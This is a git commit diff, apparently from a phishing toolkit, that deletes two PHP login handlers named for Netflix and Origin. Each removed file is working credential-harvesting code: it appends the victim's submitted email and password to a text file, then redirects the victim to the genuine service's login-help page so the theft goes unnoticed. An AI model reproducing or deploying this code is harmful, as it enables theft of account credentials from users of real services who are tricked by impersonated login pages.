a1aa6c16d320c263e97385b901c56fca3d073879
hax0rtahm1d <tahmidrayat@gmail.com>
2020-10-29 08:51:21 +0000

    Version 2.1 beta release

--- websites/netflix/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.netflix.com/us/LoginHelp');
-exit();
--- websites/origin/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://signin.ea.com/p/originX/resetPassword?execution=e1430406479s1');
-exit();
